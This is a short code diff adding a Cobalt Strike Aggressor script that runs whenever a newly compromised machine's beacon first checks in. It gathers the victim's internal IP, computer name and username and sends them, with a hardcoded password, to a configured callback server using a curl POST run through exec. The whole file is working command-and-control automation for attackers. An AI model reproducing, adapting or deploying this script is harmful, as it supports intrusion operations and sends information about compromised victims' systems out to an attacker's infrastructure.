@@ -1,0 +1,16 @@
+# ------------ set these config: ------------
+$password = "fuckhiram";
+$serverurl = 'http://127.0.0.1:666/cobaltstrikecallback';    
+# -------------------------------------------
+
+
+
+on beacon_initial {
+    println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));
+    local('$ip $computername $username');
+    $ip = replace(beacon_info($1, "internal"), " ", "_");
+    $computername = replace(beacon_info($1, "computer"), " ", "_");
+    $username = replace(beacon_info($1, "user"), " ", "_");
+    @curl_command = @('curl', '-X', 'POST', '--data-urlencode', 'password='.$password,'--data-urlencode', 'username='.$username,'--data-urlencode','computername='.$computername,'--data-urlencode','ip='.$ip, $serverurl);
+    exec(@curl_command);
+}
